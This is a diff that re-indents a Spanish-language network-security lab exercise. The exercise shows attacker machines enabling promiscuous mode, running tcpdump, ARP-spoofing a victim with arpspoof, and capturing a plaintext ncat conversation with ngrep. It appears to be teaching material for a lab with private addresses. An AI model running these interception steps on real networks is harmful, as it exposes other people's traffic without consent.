@@ -64,41 +64,41 @@
 
    1. Desde la PC Atacante2, realice un ataque de sniffing.
 
-   ```bash
-   root@Atacante2$ ip link eth0 promic on
-   root@Atacante2$ tcpdump -i eth0
-   ```
+      ```bash
+root@Atacante2$ ip link eth0 promic on
+root@Atacante2$ tcpdump -i eth0
+      ```
 
-2. Desde la PC Atacante1, realice un ataque de sniffing. 
+   2. Desde la PC Atacante1, realice un ataque de sniffing. 
 
-   ```bash
-   root@Atacante1$ arpspoof -i eth0 -t 10.0.0.21 10.0.0.1
-   ```
+      ```bash
+root@Atacante1$ arpspoof -i eth0 -t 10.0.0.21 10.0.0.1
+      ```
 
-   ```bash
-   root@Servidor$ ncat -l -k -t 8888
-   hello from Victima
-   hello from Servidor
-   ```
+      ```bash
+root@Servidor$ ncat -l -k -t 8888
+hello from Victima
+hello from Servidor
+      ```
 
-   ```bash
-   root@Victima$ ncat 10.0.1.10 8888
-   hello from Victima
-   hello from Servidor
-   ```
+      ```bash
+root@Victima$ ncat 10.0.1.10 8888
+hello from Victima
+hello from Servidor
+      ```
 
-   ```bash
-   root@Atacante1$ ngrep port 8888
-   interface: eth0 (10.0.0.0/255.255.255.0)
-   filter: (ip or ip6) and ( port 8888 )
-   ####
-   T 10.0.0.21:33913 -> 10.0.1.10:8888 [AP]
-     hello from Victima.                                                        
-   #
-   T 10.0.0.21:33913 -> 10.0.1.10:8888 [AP]
-     hello from Victima.                                                        
-   ##
-   T 10.0.1.10:8888 -> 10.0.0.21:33913 [AP]
-     hello from Servidor.                                                       
-   ##
-   ```
+      ```bash
+root@Atacante1$ ngrep port 8888
+interface: eth0 (10.0.0.0/255.255.255.0)
+filter: (ip or ip6) and ( port 8888 )
+####
+T 10.0.0.21:33913 -> 10.0.1.10:8888 [AP]
+  hello from Victima.                                                        
+#
+T 10.0.0.21:33913 -> 10.0.1.10:8888 [AP]
+  hello from Victima.                                                        
+##
+T 10.0.1.10:8888 -> 10.0.0.21:33913 [AP]
+  hello from Servidor.                                                       
+##
+      ```
